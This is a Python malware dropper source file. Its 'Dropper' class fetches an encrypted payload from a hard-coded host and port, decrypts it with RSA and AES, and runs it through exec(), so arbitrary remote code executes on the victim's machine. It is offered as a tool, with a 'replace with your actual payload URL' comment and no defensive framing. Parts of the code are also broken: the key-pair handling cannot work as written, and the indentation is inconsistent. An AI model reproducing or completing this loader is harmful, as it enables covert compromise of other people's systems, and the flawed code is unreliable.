import os
import sys
import base64
import requests
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from typing import Tuple

class Dropper:
   def __init__(self, aes_key: bytes, rsa_key_pair):
        self.aes_key = aes_key
        self.rsa_public_key, self.rsa_private_key = rsa_key_pair
        self.cipher_aes = AES.new(self.aes_key, AES.MODE_CBC)
        self.iv = self.cipher_aes.iv
        self.cipher_rsa = PKCS1_OAEP.new(self.rsa_public_key)
        self.cipher_rsa_private = PKCS1_OAEP.new(self.rsa_private_key)

   def download_payload(self, url: str, output_path: str) -> None:
        try:
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(output_path, 'wb') as file:
                file.write(response.content)
            print(f"Payload downloaded successfully: {output_path}")
        except requests.RequestException as e:
            print(f"Failed to download payload: {e}")
            sys.exit(1)

   def execute_payload(self, payload_path: str) -> None:
        try:
            with open(payload_path, 'rb') as file:
                encrypted_payload = file.read()
            decrypted_payload = self.decrypt_payload(encrypted_payload)
            exec(decrypted_payload, globals())
            print("Payload executed successfully.")
        except Exception as e:
            print(f"Failed to execute payload: {e}")
            sys.exit(1)

   def encrypt_payload(self, data: bytes) -> bytes:
        cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv)
        padded_data = pad(data, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        encrypted_data_with_iv = self.iv + encrypted_data
        encrypted_aes_key = self.cipher_rsa.encrypt(self.aes_key)
        combined_encrypted_data = encrypted_aes_key + encrypted_data_with_iv
        return combined_encrypted_data

   def decrypt_payload(self, encrypted_data: bytes) -> bytes:
        encrypted_aes_key = encrypted_data[:256]
        encrypted_data_with_iv = encrypted_data[256:]
        decrypted_aes_key = self.cipher_rsa_private.decrypt(encrypted_aes_key)
        cipher = AES.new(decrypted_aes_key, AES.MODE_CBC, encrypted_data_with_iv[:AES.block_size])
        encrypted_data = encrypted_data_with_iv[AES.block_size:]
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted_data

   def generate_rsa_key_pair() -> Tuple:
    key = RSA.generate(2048)
    private_key = key
    public_key = key.publickey()
    return (public_key, private_key)

def main():
    try:
        aes_key = os.urandom(32)
        rsa_key_pair = tuple()
        dropper = Dropper(aes_key, rsa_key_pair)

        payload_url = "http://192.168.1.117:4444"  # Replace with your actual payload URL
        payload_path = "payload.bin"

        dropper.download_payload(payload_url, payload_path)
        dropper.execute_payload(payload_path)

    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
